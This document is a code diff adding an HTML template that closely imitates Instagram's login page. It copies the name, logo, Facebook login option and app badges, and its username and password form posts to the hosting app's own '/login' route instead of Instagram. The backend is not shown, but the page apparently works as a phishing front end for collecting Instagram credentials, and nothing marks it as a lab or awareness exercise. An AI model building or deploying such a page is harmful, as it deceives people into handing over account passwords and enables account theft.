@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg viewBox="0 0 24 24" width="40" height="40" fill="url(#grad)">
+                    <defs>
+                        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#f09433"/>
+                            <stop offset="25%" stop-color="#e6683c"/>
+                            <stop offset="50%" stop-color="#dc2743"/>
+                            <stop offset="75%" stop-color="#cc2366"/>
+                            <stop offset="100%" stop-color="#bc1888"/>
+                        </linearGradient>
+                    </defs>
+                    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="url(#grad)"/>
+                    <circle cx="12" cy="12" r="5" fill="none" stroke="white" stroke-width="1.5"/>
+                    <circle cx="17.5" cy="6.5" r="1.2" fill="white"/>
+                </svg>
+                <h1>Instagram</h1>
+            </div>
+
+            {% if error %}
+            <div class="error-msg">{{ error }}</div>
+            {% endif %}
+
+            {% if message %}
+            <div class="info-msg">{{ message }}</div>
+            {% endif %}
+
+            <form method="POST" action="/login">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+
+            <div class="divider"><span>OR</span></div>
+
+            <div class="facebook-login">
+                <svg width="16" height="16" viewBox="0 0 16 16">
+                    <circle cx="8" cy="8" r="8" fill="#1877f2"/>
+                    <path d="M8.6 4.2c-.5 0-1 .2-1.3.5-.3.3-.5.8-.5 1.3v.8H6v1.2h.8v3.6h1.4V8h1.2l.2-1.2H8.2v-.8c0-.2.1-.3.2-.4.1-.1.3-.1.6-.1h.8V4.3h-.8c-.2-.1-.4-.1-.4-.1z" fill="white"/>
+                </svg>
+                <span>Log in with Facebook</span>
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+
+        <div class="signup-card">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <img src="https://static.cdninstagram.com/rsrc.php/v4/y5/r/T4P28XYhMzs.png" alt="Google Play" width="136">
+                <img src="https://static.cdninstagram.com/rsrc.php/v4/yr/r/HJj4UQ3QO5c.png" alt="Microsoft" width="136">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
